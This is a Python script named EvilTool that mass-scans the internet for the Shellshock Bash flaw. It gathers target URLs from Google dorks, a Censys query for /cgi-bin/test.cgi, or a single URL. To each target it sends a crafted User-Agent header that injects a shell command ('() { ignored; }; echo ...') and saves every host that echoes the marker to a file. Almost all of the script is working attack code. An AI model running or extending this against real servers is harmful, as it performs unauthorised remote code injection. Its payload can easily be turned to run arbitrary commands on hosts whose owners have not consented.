#!/usr/bin/env python
# coding=utf-8

from termcolor import cprint
import json, requests, os
import google
import argparse


API_URL = "https://www.censys.io/api/v1"
UID = ""
SECRET = ""

pages = float('inf')
page = 1

def arguments():
    parser = argparse.ArgumentParser(description = banner())
    parser.add_argument('-m', '--mode', action = 'store', dest = 'mode',required = True, help = 'Mode of search, use google, censys or single')
    parser.add_argument('-d', '--dork', action = 'store', dest = 'dork', default='filetype:cgi', required = False, help = 'Set the google dork.')
    parser.add_argument('-p', '--proxy', action = 'store', dest = 'proxy',required = False, help = 'Set proxy Server to Google search')
    parser.add_argument('-u', '--url', action = 'store', dest = 'url', required = False, help= 'Set URL to test ShellShock Vulnerability')
    args = parser.parse_args()
    if args.mode.lower() == 'google':
        dork = args.dork
        proxy = args.proxy
        search_google(dork,proxy)
    elif args.mode.lower() == 'censys':
        search(API_URL,UID,SECRET,page,pages)
    elif args.mode.lower() == 'single':
        url = args.url
        if url is None:
            parser.print_help()
        else:
            single(url)
    else:
        parser.print_help()

def single(url):
    test_conn(url)

def search_google(dork,proxy):
    from google import search
    if proxy is None:
        for url in search(dork):
            test_conn(url)
        print
    else:
        for url in search(dork,ip=proxy,conn_type='http'):
            test_conn(url)
        print
    cprint('[+] - GAME OVER - [+]','red','on_yellow')
    cprint('[+] - PRESS ANY KEY - [+]','red','on_yellow')
    raw_input()

def search(API_URL,UID,SECRET,page,pages):
    check_conf()
    while page <= pages:
        query = {'query':'80.http.get.title:/cgi-bin/test.cgi','page':page}
        res = requests.post(API_URL + "/search/ipv4", auth=(UID, SECRET), json=query)
        res_json = res.json()
        if res.status_code == 200:
            build_url(res_json)
        pages = res_json['metadata']['pages']
        page += 1

def build_url(res_json):
    for info in res_json['results']:
        full_url = 'http://'+info['ip']+'/cgi-bin/test.cgi'
        test_conn(full_url)

def test_conn(url):
    user_agent = {'User-Agent':"() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; echo 'EVILTOOLZIKAMEMO'"}
    try:
        shel_shock_conn = requests.get(url, timeout=5, headers=user_agent ,allow_redirects=True)
        cprint('[+] - Testing connection '+url,'blue')
        shel_shock_conn_status_code = shel_shock_conn.status_code
        test_vuln(shel_shock_conn_status_code,shel_shock_conn,url)
    except:
        pass

def test_vuln(status_code,host_connection,url):
        if status_code != 200:
            cprint("[!] - Something goes wrong",'red')
            print("[!] - Status code: %d") %(status_code)
            print

        else:
            cprint("[+] - Connection success",'green')
            print("[+] - Status Code: %d") %(status_code)

            if host_connection.content.find('EVILTOOLZIKAMEMO') != -1:
                cprint("[+] - Host Vuln3r4bl3",'green',attrs=['bold'])
                arq = open('Vuln3r4bl3.txt','a')
                arq.write(url+"\n")
                arq.close
                print
            else:
                cprint("[!] - host not Vulnerable :/",'green','on_red')
                print

def check_conf():
    if UID == '' or SECRET == '':
        cprint('''
███████╗██████╗ ██████╗  ██████╗
██╔════╝██╔══██╗██╔══██╗██╔═══██╗
█████╗  ██████╔╝██████╔╝██║   ██║
██╔══╝  ██╔══██╗██╔══██╗██║   ██║
███████╗██║  ██║██║  ██║╚██████╔╝
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝

██╗  ██╗ ██████╗ ██╗  ██╗
██║  ██║██╔═████╗██║  ██║
███████║██║██╔██║███████║
╚════██║████╔╝██║╚════██║
     ██║╚██████╔╝     ██║
     ╚═╝ ╚═════╝      ╚═╝
        ''')
        cprint('[!] - PLEASE CONFIGURE YOUR API ID AND YOUR SECRET - [!]','yellow','on_red',attrs=['bold'])
        cprint('[!] - TUTORIAL VISIT- [!]','yellow','on_red',attrs=['bold'])
        cprint('https://github.com/mthbernardes/EvilTool/blob/master/README.md','yellow','on_red',attrs=['bold'])
        print
        exit()
    else:
        pass

def banner():
    cprint('''
   ▄████████  ▄█    █▄   ▄█   ▄█           ███      ▄██████▄   ▄██████▄   ▄█
  ███    ███ ███    ███ ███  ███       ▀█████████▄ ███    ███ ███    ███ ███
  ███    █▀  ███    ███ ███▌ ███          ▀███▀▀██ ███    ███ ███    ███ ███
 ▄███▄▄▄     ███    ███ ███▌ ███           ███   ▀ ███    ███ ███    ███ ███
▀▀███▀▀▀     ███    ███ ███▌ ███           ███     ███    ███ ███    ███ ███
  ███    █▄  ███    ███ ███  ███           ███     ███    ███ ███    ███ ███
  ███    ███ ███    ███ ███  ███▌    ▄     ███     ███    ███ ███    ███ ███▌    ▄
  ██████████  ▀██████▀  █▀   █████▄▄██    ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██
                             ▀                                           ▀
   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█               ▄████████    ▄█    █▄     ▄██████▄   ▄████████    ▄█   ▄█▄
  ███    ███   ███    ███     ███    ███ ███       ███              ███    ███   ███    ███   ███    ███ ███    ███   ███ ▄███▀
  ███    █▀    ███    ███     ███    █▀  ███       ███              ███    █▀    ███    ███   ███    ███ ███    █▀    ███▐██▀
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███              ███         ▄███▄▄▄▄███▄▄ ███    ███ ███         ▄█████▀
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███            ▀███████████ ▀▀███▀▀▀▀███▀  ███    ███ ███        ▀▀█████▄
         ███   ███    ███     ███    █▄  ███       ███                     ███   ███    ███   ███    ███ ███    █▄    ███▐██▄
   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄         ▄█    ███   ███    ███   ███    ███ ███    ███   ███ ▀███▄
 ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██       ▄████████▀    ███    █▀     ▀██████▀  ████████▀    ███   ▀█▀
                                         ▀         ▀                                                                  ▀
    ''','red')
    cprint('[+] - Author: Matheus Bernardes','red')
    cprint('[+] - Nick: G4mbler','red')
    cprint('[+] - Vulnerability Description','red')
    cprint('''
GNU Bash through 4.3 processes trailing strings after function definitions in
the values of environment variables, which allows remote attackers to execute
arbitrary code via a crafted environment, as demonstrated by vectors involving
the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in
the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other
situations in which setting the environment occurs across a privilege boundary
from Bash execution, aka "ShellShock." NOTE: the original fix for this issue was
incorrect; CVE-2014-7169 has been assigned to cover the vulnerability that is
still present after the incorrect fix.
    ''','red')
def main():
    arguments()

main()
